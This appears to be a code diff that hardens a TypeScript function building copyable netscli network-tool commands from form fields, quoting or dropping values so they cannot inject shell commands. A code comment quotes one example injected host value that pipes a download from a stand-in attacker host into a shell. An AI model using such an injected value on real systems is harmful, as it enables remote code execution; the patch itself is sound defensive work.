@@ -1,6 +1,41 @@
 import { scanRequest } from '../scanRequest';
 import type { WorkspaceTab } from '../types';
 
+/** Characters that never need quoting in any shell. */
+const PLAIN = /^[\w@+=:,./-]+$/;
+
+/**
+ * Characters that cannot be quoted safely for every shell this might be pasted
+ * into. `$` and the backtick expand inside double quotes in bash and
+ * PowerShell, a `"` ends the string in all of them, `%` and `!` expand in cmd
+ * and bash, and a trailing backslash escapes the closing quote.
+ */
+const UNQUOTABLE = /[$`"%!\p{Cc}]|\\$/u;
+
+/**
+ * A form value as one argument of the copied command, or '' when it cannot be
+ * made one.
+ *
+ * The command is shown in the strip and copied from it, and every value in it
+ * comes from the form, which a shared result bundle can fill with anything. A
+ * host of `1.1.1.1; curl https://evil.example | sh` used to be one click from
+ * the clipboard as a working command. Now it comes out as a single quoted
+ * argument, and a value that cannot be quoted is left out like an empty one,
+ * so the command that is shown never contains anything a shell would act on.
+ */
+function arg(raw: string | undefined): string {
+  const value = raw?.trim() ?? '';
+  if (PLAIN.test(value)) return value;
+  if (!value || UNQUOTABLE.test(value)) return '';
+  return `"${value}"`;
+}
+
+/** ` --name value`, or nothing when there is no value to pass. */
+function flag(name: string, raw: string | undefined): string {
+  const value = arg(raw);
+  return value ? ` ${name} ${value}` : '';
+}
+
 export function buildCommand(tab: WorkspaceTab): string {
   const form = tab.form;
   switch (tab.kind) {
@@ -14,34 +49,36 @@ export function buildCommand(tab: WorkspaceTab): string {
       // menu recorded, and what got stored with the saved result.
     {
       const { ports, udp } = scanRequest(form);
-      return `netscli scan ${form.host || '<host>'}${ports ? ` -p ${ports}` : ''}${udp ? ' --udp' : ''} --json`;
+      return `netscli scan ${arg(form.host) || '<host>'}${flag('-p', ports)}${udp ? ' --udp' : ''} --json`;
     }
     case 'ping':
-      return `netscli ping ${form.host || '<host>'}${form.count ? ` --count ${form.count}` : ''} --json`;
+      return `netscli ping ${arg(form.host) || '<host>'}${flag('--count', form.count)} --json`;
     case 'trace': {
       const resolve = form.resolve === 'On' ? ' --resolve' : '';
-      return `netscli trace ${form.host || '<host>'}${form.max_hops ? ` --max-hops ${form.max_hops}` : ''}${resolve} --json`;
+      return `netscli trace ${arg(form.host) || '<host>'}${flag('--max-hops', form.max_hops)}${resolve} --json`;
     }
-    case 'discover':
-      return `netscli discover${form.subnet ? ` ${form.subnet}` : ''} --resolve --json`;
+    case 'discover': {
+      const subnet = arg(form.subnet);
+      return `netscli discover${subnet ? ` ${subnet}` : ''} --resolve --json`;
+    }
     case 'dns': {
-      const record = form.record && form.record !== 'ALL' ? ` --record ${form.record}` : '';
-      return `netscli dns ${form.host || '<host>'}${record} --json`;
+      const record = flag('--record', form.record === 'ALL' ? '' : form.record);
+      return `netscli dns ${arg(form.host) || '<host>'}${record} --json`;
     }
     case 'reverse':
-      return `netscli reverse ${form.ip || '<ip>'} --json`;
+      return `netscli reverse ${arg(form.ip) || '<ip>'} --json`;
     case 'inspect':
-      return `netscli inspect ${form.host || '<host>'}${form.ports ? ` -p ${form.ports}` : ''} --json`;
-    case 'sweep':
-      return `netscli sweep${form.subnet ? ` ${form.subnet}` : ''}${form.ports ? ` -p ${form.ports}` : ''} --resolve --json`;
+      return `netscli inspect ${arg(form.host) || '<host>'}${flag('-p', form.ports)} --json`;
+    case 'sweep': {
+      const subnet = arg(form.subnet);
+      return `netscli sweep${subnet ? ` ${subnet}` : ''}${flag('-p', form.ports)} --resolve --json`;
+    }
     case 'mdns': {
       const types = form.service_types
         ?.split(',')
-        .map((item) => item.trim())
-        .filter(Boolean)
-        .map((item) => ` --type ${item}`)
+        .map((item) => flag('--type', item))
         .join('') ?? '';
-      const timeout = form.timeout_ms && form.timeout_ms !== '3000' ? ` --timeout-ms ${form.timeout_ms}` : '';
+      const timeout = form.timeout_ms !== '3000' ? flag('--timeout-ms', form.timeout_ms) : '';
       return `netscli mdns${timeout}${types} --json`;
     }
     case 'interfaces':
@@ -50,19 +87,11 @@ export function buildCommand(tab: WorkspaceTab): string {
       return 'netscli arp --json';
     case 'pcap': {
       if (form.mode === 'Open File') {
-        return `netscli pcap --read <file>${form.max_packets ? ` --max-packets ${form.max_packets}` : ''} --json`;
+        return `netscli pcap --read <file>${flag('--max-packets', form.max_packets)} --json`;
       }
-      const parts = ['netscli pcap'];
-      if (form.interface) parts.push(`--interface ${form.interface}`);
-      if (form.duration) parts.push(`--duration ${form.duration}`);
-      // Escape quotes rather than interpolating raw: a BPF filter containing
-      // a double quote produced a preview that would not parse if pasted.
-      if (form.filter) parts.push(`--filter "${form.filter.replace(/"/g, '\\"')}"`);
-      if (form.max_packets) parts.push(`--max-packets ${form.max_packets}`);
       // The capture branch omitted --json while every other command here
       // includes it, so this one preview did not match what the app runs.
-      parts.push('--json');
-      return parts.join(' ');
+      return `netscli pcap${flag('--interface', form.interface)}${flag('--duration', form.duration)}${flag('--filter', form.filter)}${flag('--max-packets', form.max_packets)} --json`;
     }
   }
 }
